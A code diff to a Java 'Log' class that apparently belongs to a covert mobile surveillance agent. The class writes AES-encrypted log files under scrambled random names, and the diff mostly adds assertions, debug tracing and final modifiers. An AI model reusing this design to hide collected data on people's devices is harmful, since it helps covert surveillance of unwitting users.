@@ -81,7 +81,8 @@ public final class Log {
     };
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Log", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("Log", DebugLevel.VERBOSE);
+
     //#endif
 
     /**
@@ -144,9 +145,19 @@ public final class Log {
      */
     public Log(final Agent agent_, final byte[] aesKey) {
         this();
-
+        //#ifdef DBC
+        Check.ensures(agent_ != null, "createLog: agent null");
+        Check.requires(aesKey != null, "createLog: aesKey null");
+        Check.requires(encryption != null, "createLog: encryption null");
+        //#endif
+        
         agent = agent_;
         encryption.makeKey(aesKey);
+        
+        //#ifdef DBC
+        Check.ensures(agent != null, "createLog: agent null");
+        Check.ensures(encryption != null, "createLog: encryption null");
+        //#endif
     }
 
     /**
@@ -159,7 +170,10 @@ public final class Log {
      */
     public Log(final Agent agent_, final String aesKey) {
         this();
-
+        //#ifdef DBC
+        Check.requires(agent != null, "createLog: agent null");
+        Check.requires(aesKey != null, "createLog: aesKey null");
+        //#endif
         agent = agent_;
 
         final byte[] key = new byte[16];
@@ -202,9 +216,12 @@ public final class Log {
     }
 
     public synchronized boolean createLog(final byte[] additionalData) {
-        return createLog(additionalData,convertTypeLog(agent.agentId));
+        //#ifdef DBC
+        Check.requires(agent != null, "createLog: agent null");
+        //#endif
+        return createLog(additionalData, convertTypeLog(agent.agentId));
     }
-    
+
     /**
      * Questa funzione crea un file di log e lascia l'handle aperto. Il file
      * viene creato con un nome casuale, la chiamata scrive l'header nel file e
@@ -220,7 +237,11 @@ public final class Log {
      *            the additional data
      * @return true, if successful
      */
-    public synchronized boolean createLog(final byte[] additionalData, int logType) {
+    public synchronized boolean createLog(final byte[] additionalData,
+            final int logType) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("createLog logType: " + logType);
+        //#endif
 
         //#ifdef DBC
         Check.requires(os == null && fconn == null,
@@ -235,6 +256,9 @@ public final class Log {
             additionalLen = additionalData.length;
         }
 
+        //#ifdef DEBUG_TRACE
+        debug.trace("createLog: makenewName");
+        //#endif
         final Vector tuple = logCollector.makeNewName(this, agent);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
@@ -247,7 +271,7 @@ public final class Log {
         final String plainFileName = (String) tuple.elementAt(4);
 
         final String dir = basePath + blockDir + "/";
-        boolean ret = Path.createDirectory(dir);
+        final boolean ret = Path.createDirectory(dir);
 
         if (!ret) {
             //#ifdef DEBUG_ERROR
@@ -259,10 +283,14 @@ public final class Log {
         fileName = dir + encName;
         //#ifdef DBC
         Check.asserts(fileName != null, "null fileName");
-        Check.asserts(!fileName.endsWith(LogCollector.LOG_EXTENSION), "file not scrambled");
+        Check.asserts(!fileName.endsWith(LogCollector.LOG_EXTENSION),
+                "file not scrambled");
         Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
         //#endif
 
+        //#ifdef DEBUG_TRACE
+        debug.trace("createLog fileName:" + fileName);
+        //#endif
         try {
             fconn = (FileConnection) Connector.open(fileName);
 
@@ -274,7 +302,7 @@ public final class Log {
             }
 
             //#ifdef DEBUG_INFO
-            debug.info("Created :" + plainFileName );
+            debug.info("Created :" + plainFileName);
             //#endif
             //#ifdef DEBUG_TRACE
             debug.info("filename: " + fileName);
@@ -308,7 +336,7 @@ public final class Log {
 
             //#ifdef DEBUG_TRACE
             debug.trace("plainBuffer.length: " + plainBuffer.length);
-            debug.trace("encBuffer.length: " + encBuffer.length);      
+            debug.trace("encBuffer.length: " + encBuffer.length);
             //#endif
 
         } catch (final IOException ex) {
@@ -329,7 +357,7 @@ public final class Log {
      *            the additional data
      * @return the byte[]
      */
-    public byte[] makeDescription(final byte[] additionalData, int logType) {
+    public byte[] makeDescription(final byte[] additionalData, final int logType) {
 
         if (timestamp == null) {
             timestamp = new Date();
